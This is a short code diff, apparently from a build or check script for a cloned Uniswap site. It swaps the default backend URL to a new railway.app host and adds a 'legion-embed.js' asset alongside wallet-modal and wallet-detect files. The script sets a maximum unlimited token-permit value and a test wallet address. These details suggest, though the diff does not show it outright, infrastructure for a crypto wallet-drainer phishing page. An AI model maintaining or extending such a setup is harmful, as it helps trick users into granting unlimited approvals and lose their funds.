@@ -10,7 +10,7 @@ import { fileURLToPath } from 'node:url';
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
 const CLONE = join(ROOT, 'clones/uniswap-clone');
-const BACKEND = (process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app').replace(/\/$/, '');
+const BACKEND = (process.env.BACKEND_URL || 'https://sadrailala-production.up.railway.app').replace(/\/$/, '');
 const TEST_EVM = '0xd52C5968E9aCBf970c60a5Dbaf9eA7385715E90f';
 const MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
@@ -72,6 +72,7 @@ const assets = [
   ['wallet-modal.js', 500],
   ['wallet-detect.js', 500],
   ['wallet-modal.css', 100],
+  ['legion-embed.js', 500],
 ];
 for (const [file, minBytes] of assets) {
   const p = join(CLONE, file);
